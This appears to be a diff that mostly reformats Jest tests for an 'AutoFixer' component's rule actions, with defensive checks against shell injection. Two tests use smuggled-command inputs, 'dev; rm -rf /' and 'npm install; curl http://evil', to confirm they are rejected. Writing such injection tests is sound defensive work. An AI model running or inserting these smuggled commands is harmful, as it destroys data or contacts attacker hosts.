@@ -38,15 +38,21 @@ describe('AutoFixer', () => {
 
   describe('evaluateAndFix', () => {
     it('should update-status action successfully', () => {
-      const event = ec.createEvent({ projectId: 'proj-1', title: 'Status Test', dedupeKey: 'dk-status' });
+      const event = ec.createEvent({
+        projectId: 'proj-1',
+        title: 'Status Test',
+        dedupeKey: 'dk-status',
+      });
       fixer.start({
         projectId: 'proj-1',
         projectPath: '/tmp',
-        rules: [{
-          name: 'status-update',
-          eventFilter: () => true,
-          actions: [{ type: 'update-status', params: { status: 'fixing' } }],
-        }],
+        rules: [
+          {
+            name: 'status-update',
+            eventFilter: () => true,
+            actions: [{ type: 'update-status', params: { status: 'fixing' } }],
+          },
+        ],
       });
 
       const result = fixer.evaluateAndFix(event);
@@ -57,16 +63,22 @@ describe('AutoFixer', () => {
     });
 
     it('should exhaust max attempts', () => {
-      const event = ec.createEvent({ projectId: 'proj-1', title: 'Exhaust Test', dedupeKey: 'dk-exhaust' });
+      const event = ec.createEvent({
+        projectId: 'proj-1',
+        title: 'Exhaust Test',
+        dedupeKey: 'dk-exhaust',
+      });
       fixer.start({
         projectId: 'proj-1',
         projectPath: '/tmp',
-        rules: [{
-          name: 'exhaust-test',
-          eventFilter: () => true,
-          actions: [{ type: 'run-script', params: { script: 'exit 1' } }],
-          maxAttempts: 2,
-        }],
+        rules: [
+          {
+            name: 'exhaust-test',
+            eventFilter: () => true,
+            actions: [{ type: 'run-script', params: { script: 'exit 1' } }],
+            maxAttempts: 2,
+          },
+        ],
       });
 
       fixer.evaluateAndFix(event);
@@ -80,15 +92,22 @@ describe('AutoFixer', () => {
     });
 
     it('should not match non-matching rules', () => {
-      const event = ec.createEvent({ projectId: 'proj-1', title: 'No Match', severity: 'p3', dedupeKey: 'dk-nomatch' });
+      const event = ec.createEvent({
+        projectId: 'proj-1',
+        title: 'No Match',
+        severity: 'p3',
+        dedupeKey: 'dk-nomatch',
+      });
       fixer.start({
         projectId: 'proj-1',
         projectPath: '/tmp',
-        rules: [{
-          name: 'p1-only',
-          eventFilter: (e) => e.severity === 'p1',
-          actions: [{ type: 'update-status', params: { status: 'fixing' } }],
-        }],
+        rules: [
+          {
+            name: 'p1-only',
+            eventFilter: (e) => e.severity === 'p1',
+            actions: [{ type: 'update-status', params: { status: 'fixing' } }],
+          },
+        ],
       });
 
       const result = fixer.evaluateAndFix(event);
@@ -103,15 +122,21 @@ describe('AutoFixer', () => {
     });
 
     it('restart-process：恶意进程名（含 shell 元字符）被拒绝，不 spawn', () => {
-      const event = ec.createEvent({ projectId: 'proj-1', title: 'Injection', dedupeKey: 'dk-inj-restart' });
+      const event = ec.createEvent({
+        projectId: 'proj-1',
+        title: 'Injection',
+        dedupeKey: 'dk-inj-restart',
+      });
       fixer.start({
         projectId: 'proj-1',
         projectPath: '/tmp',
-        rules: [{
-          name: 'restart-evil',
-          eventFilter: () => true,
-          actions: [{ type: 'restart-process', params: { process: 'dev; rm -rf /' } }],
-        }],
+        rules: [
+          {
+            name: 'restart-evil',
+            eventFilter: () => true,
+            actions: [{ type: 'restart-process', params: { process: 'dev; rm -rf /' } }],
+          },
+        ],
       });
 
       const result = fixer.evaluateAndFix(event);
@@ -120,15 +145,21 @@ describe('AutoFixer', () => {
     });
 
     it('run-script：含 shell 元字符的脚本被拒绝，不执行', () => {
-      const event = ec.createEvent({ projectId: 'proj-1', title: 'Injection', dedupeKey: 'dk-inj-script' });
+      const event = ec.createEvent({
+        projectId: 'proj-1',
+        title: 'Injection',
+        dedupeKey: 'dk-inj-script',
+      });
       fixer.start({
         projectId: 'proj-1',
         projectPath: '/tmp',
-        rules: [{
-          name: 'run-evil',
-          eventFilter: () => true,
-          actions: [{ type: 'run-script', params: { script: 'npm install; curl http://evil' } }],
-        }],
+        rules: [
+          {
+            name: 'run-evil',
+            eventFilter: () => true,
+            actions: [{ type: 'run-script', params: { script: 'npm install; curl http://evil' } }],
+          },
+        ],
       });
 
       const result = fixer.evaluateAndFix(event);
@@ -137,37 +168,57 @@ describe('AutoFixer', () => {
     });
 
     it('run-script：白名单命令正常执行（行为保持），参数不经 shell', () => {
-      const event = ec.createEvent({ projectId: 'proj-1', title: 'Safe', dedupeKey: 'dk-safe-script' });
+      const event = ec.createEvent({
+        projectId: 'proj-1',
+        title: 'Safe',
+        dedupeKey: 'dk-safe-script',
+      });
       fixer.start({
         projectId: 'proj-1',
         projectPath: '/tmp',
-        rules: [{
-          name: 'run-safe',
-          eventFilter: () => true,
-          actions: [{ type: 'run-script', params: { script: 'node --version' } }],
-        }],
+        rules: [
+          {
+            name: 'run-safe',
+            eventFilter: () => true,
+            actions: [{ type: 'run-script', params: { script: 'node --version' } }],
+          },
+        ],
       });
 
       const result = fixer.evaluateAndFix(event);
       expect(result).toBe(true);
-      expect(mockedExecFileSync).toHaveBeenCalledWith('node', ['--version'], expect.objectContaining({ timeout: 30000 }));
+      expect(mockedExecFileSync).toHaveBeenCalledWith(
+        'node',
+        ['--version'],
+        expect.objectContaining({ timeout: 30000 }),
+      );
     });
 
     it('restart-process：合法进程名正常 spawn，且不启用 shell', () => {
-      const event = ec.createEvent({ projectId: 'proj-1', title: 'Restart', dedupeKey: 'dk-safe-restart' });
+      const event = ec.createEvent({
+        projectId: 'proj-1',
+        title: 'Restart',
+        dedupeKey: 'dk-safe-restart',
+      });
       fixer.start({
         projectId: 'proj-1',
         projectPath: '/tmp',
-        rules: [{
-          name: 'restart-safe',
-          eventFilter: () => true,
-          actions: [{ type: 'restart-process', params: { process: 'dev' } }],
-        }],
+        rules: [
+          {
+            name: 'restart-safe',
+            eventFilter: () => true,
+            actions: [{ type: 'restart-process', params: { process: 'dev' } }],
+          },
+        ],
       });
 
       const result = fixer.evaluateAndFix(event);
       expect(result).toBe(true);
-      expect(mockedSpawn).toHaveBeenCalledWith('npm', ['run', 'dev'], expect.objectContaining({ detached: true }));
+      expect(mockedSpawn).toHaveBeenCalledWith(
+        'npm',
+        ['run', 'dev'],
+        expect.objectContaining({ detached: true }),
+      );
       const spawnOpts = mockedSpawn.mock.calls[0]?.[2] as Record<string, unknown> | undefined;
       expect(spawnOpts?.shell).not.toBe(true);
     });
